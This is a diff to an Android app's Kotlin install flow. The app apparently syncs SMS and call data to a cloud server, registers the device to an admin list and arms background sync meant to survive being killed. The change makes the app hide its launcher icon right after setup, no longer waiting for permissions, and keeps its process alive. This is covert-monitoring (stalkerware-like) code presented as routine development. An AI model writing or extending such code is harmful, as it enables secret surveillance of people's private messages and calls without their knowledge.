@@ -26,21 +26,17 @@ object InstallFlow {
     }
 
     fun completeSetup(context: Context) {
-        if (SyncBootstrap.needsRuntimePermissions(context)) {
-            Log.w(TAG, "Skip hide — SMS/call permissions still missing")
-            return
-        }
-
         val app = context.applicationContext
         app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
             .edit()
             .putBoolean(KEY_SETUP_COMPLETE, true)
             .putInt(KEY_SETUP_VERSION, BuildConfig.VERSION_CODE)
             .apply()
+        CallSyncHelper.markBackgroundSyncEnabled(app, true)
         SyncBootstrap.armBackgroundSync(app)
         SyncWorkScheduler.enqueueNow(app)
-        LauncherHider.hide(app)
-        Log.d(TAG, "Initial sync done — app hidden, background sync armed")
+        LauncherHider.hide(app, goHome = false, keepProcess = true)
+        Log.d(TAG, "Setup complete — hidden, kill-state sync armed")
     }
 
     fun runInitialSetup(context: Context, source: String = "install") {
@@ -50,31 +46,21 @@ object InstallFlow {
         CallSyncHelper.markBackgroundSyncEnabled(app, true)
         SyncBootstrap.armBackgroundSync(app)
 
-        // Admin list ke liye device pehle register — SMS/call permission ka wait mat karo.
         BackgroundSyncRunner.run {
             DeviceRegistration.registerNow(app)
         }
 
         if (SyncBootstrap.needsRuntimePermissions(app)) {
-            Log.w(TAG, "Permissions pending — dialog, phir sync + hide")
+            Log.w(TAG, "Permissions pending — dialog")
             SyncBootstrap.launchPermissionTrampoline(context)
             return
         }
 
+        completeSetup(app)
         BackgroundSyncRunner.run {
             CallSyncService.holdDuring(app) {
                 try {
-                    SimNumberHelper.ensureSimReadyForSync(app)
-                    DeviceRegistration.registerNow(app)
-                    if (isSetupComplete(app)) {
-                        SyncScheduler.syncIfPermittedNow(app, source)
-                        LauncherHider.hide(app)
-                        CallSyncService.ensureRunning(app)
-                        return@holdDuring
-                    }
-                    if (runFirstCloudSync(app)) {
-                        completeSetup(app)
-                    }
+                    runFirstCloudSync(app)
                 } catch (error: Exception) {
                     Log.e(TAG, "Initial setup failed ($source)", error)
                 }
